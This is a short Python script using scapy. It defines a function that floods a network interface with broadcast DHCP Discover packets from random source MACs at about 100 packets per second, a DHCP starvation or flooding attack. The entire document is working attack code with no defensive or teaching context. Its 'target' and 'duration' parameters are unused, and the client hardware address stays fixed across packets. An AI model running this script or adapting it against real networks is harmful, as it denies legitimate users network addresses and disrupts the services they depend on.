#!/usr/bin/env python3
from scapy.all import *
import random

def run_dhcp_flood(interface, target=None, duration=60, count=1000):
    print(f"[+] Sending {count} DHCP Discover packets on {interface}")
    mac = RandMAC()  # Random MAC for each
    for _ in range(count):
        dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[("message-type", "discover"), "end"])
        sendp(dhcp_discover, iface=interface, inter=0.01)  # 100 pkt/s
    print("[+] Flood complete.")
